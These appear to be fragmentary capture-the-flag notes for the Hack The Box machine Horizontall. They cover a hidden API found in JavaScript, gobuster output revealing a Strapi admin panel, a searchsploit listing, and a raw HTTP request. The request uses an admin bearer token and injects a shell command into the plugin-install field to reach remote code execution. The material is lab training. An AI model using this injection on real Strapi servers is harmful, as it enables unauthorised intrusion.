
1. Find the hidden api inside the code */js/app.c68eb462.js*
````js
methods:{getReviews:function(){var t=this;r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s){return t.reviews=s.data}))}}
````

2. Gobuster it reveals and Strapi admin painel
````bash
$ gobuster dir -x php,txt,html,bak,zip -e -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,bak,zip,php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/01/08 18:16:46 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/index.html           (Status: 200) [Size: 413]
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/robots.txt           (Status: 200) [Size: 121]
http://api-prod.horizontall.htb/Admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/REVIEWS              (Status: 200) [Size: 507]
                                                                  
===============================================================
2022/01/08 18:54:08 Finished
===============================================================
````

3. Looking for exploits shows us 3
````bash
# searchsploit strapi
-------------------------------- ---------------------------------
 Exploit Title                  |  Path
-------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Passwor | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Re | multiple/webapps/50239.py
-------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
````



1. Find api-prod.

````http
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Connection: close
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNjg1Mzg2LCJleHAiOjE2NDQyNzczODZ9.hC7xIJQQyHmfa3qOc2AmnyCTOkhgJcmZx1-_sERq_n4
Content-Length: 69

{
  "plugin":"documentation && $(ping 10.10.14.26)",
  "port":"1337"
}
````
